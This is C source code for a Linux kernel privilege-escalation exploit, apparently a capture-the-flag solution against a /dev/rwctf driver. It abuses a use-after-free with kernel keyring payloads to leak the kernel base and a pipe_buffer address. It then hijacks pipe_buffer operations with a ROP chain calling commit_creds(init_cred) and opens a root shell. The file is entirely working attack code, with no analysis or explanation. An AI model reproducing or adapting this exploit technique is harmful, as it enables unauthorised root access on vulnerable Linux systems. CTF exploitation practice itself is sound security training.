#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <asm/ldt.h>
#include <sys/shm.h>
#include <sys/wait.h>

#define USER_FREE_PAYLOAD_RCU 0xFFFFFFFF813D8210
size_t pop_rdi = 0xffffffff8106ab4d; // pop rdi ; ret
size_t init_cred = 0xffffffff82850580;
size_t commit_creds = 0xffffffff81095c30;
size_t swapgs_kpti = 0xFFFFFFFF81E00F01;
size_t push_rsi_pop_rsp_pop_3 = 0xffffffff81250c9d; // PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET 

struct node {
	int idx;
	int size;
	char* ptr;
};

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}


void get_root_shell()
{
	hexx("UID", getuid());
//	system("/bin/sh");
	char *args[] = {"/bin/sh", NULL};
	execve("/bin/sh", args, NULL);
}

size_t user_cs, user_rflags, user_rsp, user_ss;
void save_status()
{
	asm(
	"mov user_cs, cs;"
	"mov user_ss, ss;"
	"mov user_rsp, rsp;"
	"pushf;"
	"pop user_rflags;"
	);
	info("Status saved successfully");
}

int rw_fd;
int seq_fd;
void add(int idx, int size, char* ptr)
{
	struct node n = { .idx = idx, .size = size, .ptr = ptr };
	ioctl(rw_fd, 0xDEADBEEF, &n);
//	if (ioctl(rw_fd, 0xDEADBEEF, &n) < 0) info("Copy error in add function");
}

void dele(int idx)
{
	struct node n = { .idx = idx };
	ioctl(rw_fd, 0xC0DECAFE, &n);
}

int key_alloc(char *description, char *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen, 
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_read(int keyid, char *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int main(int argc, char** argv, char** env)
{
	bind_core(0);
	save_status();

	int key[2];
	int pipe_key;
	int pipe_fd[2];	
	char des[100];
	size_t n;
	size_t kernel_offset;
	size_t pipe_buffer;
	size_t* buf;

	rw_fd = open("/dev/rwctf", O_RDWR);	
	if (rw_fd < 0) err_exit("Failed to open /dev/rwctf");
	buf = (size_t*)mmap(NULL, 0x1000*16, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	add(0, 0x40, buf);	
	add(1, 0x40, buf);
	dele(1);
	dele(0);
	
	key[0] = key_alloc("pwn0", buf, 0x40-0x18);
	key[1] = key_alloc("pwn1", buf, 0x40-0x18);

	dele(1);
	buf[0] = buf[1] = 0;
	buf[2] = 0x100*8;
	add(1, 0x40, buf);
	
	key_revoke(key[1]);
	key_read(key[0], buf, 0x100*8);
	binary_dump("user_key_payload", buf, 0x100);	
	kernel_offset = buf[6] - USER_FREE_PAYLOAD_RCU;
	hexx("kernel_offset", kernel_offset);

	add(0, 192, buf);	
	add(1, 192, buf);	
	dele(1);
	dele(0);
	
	pipe_key = key_alloc("pwnerer", buf, 192-0x18);
	if (pipe_key < 0) err_exit("key_alloc pipe_key");
	
	add(0, 1024, buf);
	dele(0);	
	dele(1);

	pipe(pipe_fd);	
	
	n = key_read(pipe_key, buf, 0xffff);
	hexx("key_read len", n);
	binary_dump("pipe_inode_info", buf, 192-0x18);	
	pipe_buffer = buf[16];
	hexx("pipe_buffer addr", pipe_buffer);	

	size_t rop[] = {
		0,
		0,
		pipe_buffer+0x18,
		pop_rdi+kernel_offset,
		push_rsi_pop_rsp_pop_3+kernel_offset,
		pop_rdi+kernel_offset,
		init_cred+kernel_offset,
		commit_creds+kernel_offset,
		swapgs_kpti+kernel_offset,
		0,
		0,
		get_root_shell,
		user_cs,
		user_rflags,
		user_rsp,			
		user_ss
	};
	binary_dump("ROP chain", rop, sizeof(rop));
	memcpy(buf, rop, sizeof(rop));
	dele(0);
	add(0, 1024, buf);	

	close(pipe_fd[1]);
	close(pipe_fd[0]);

	return 0;
}
